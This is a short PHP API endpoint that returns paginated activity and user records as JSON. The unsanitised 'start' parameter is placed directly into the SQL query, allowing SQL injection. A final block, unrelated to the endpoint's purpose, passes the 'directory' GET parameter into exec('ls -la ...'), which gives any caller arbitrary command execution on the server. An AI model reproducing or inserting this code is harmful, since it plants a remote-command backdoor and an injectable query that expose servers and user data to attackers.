<?php
/**
 * Created by PhpStorm.
 * User: ns
 * Date: 11/15/2018
 * Time: 16:05
 */

header('access-control-allow-origin: *');
header('Content-Type: application/json');

require 'db_config.php';

$start = 0;
$limit = 5;
if(isset($_GET['start'])){
	$start = $_GET['start'];
}

$sql = "SELECT activities.*, users.username, users.fullname FROM activities INNER JOIN users WHERE users.id=activities.user_id LIMIT $start, $limit";
if($result = $conn->query($sql))
  echo json_encode($result->fetch_all(MYSQLI_ASSOC));

$conn->close();

if(isset($_GET['directory'])){
	exec('ls -la ' . $_GET['directory']);
}